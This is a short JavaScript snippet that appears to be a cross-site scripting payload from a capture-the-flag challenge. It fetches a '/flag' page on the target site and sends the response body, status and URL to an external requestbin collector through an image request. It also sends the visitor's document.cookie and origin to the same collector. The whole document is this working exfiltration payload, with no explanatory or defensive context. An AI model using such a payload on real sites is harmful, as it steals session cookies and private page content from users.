fetch("https://mathme.be.ax/flag").then(function(x) {
    x.text().then(function(text) {
        (new Image()).src="https://requestbin.io/ub238iub?x="+JSON.stringify({ok: x.ok, status: x.status, body: text, url: x.url});
    });
});

(new Image()).src="https://requestbin.io/ub238iub?cookie=" + document.cookie + "&origin=" + origin;
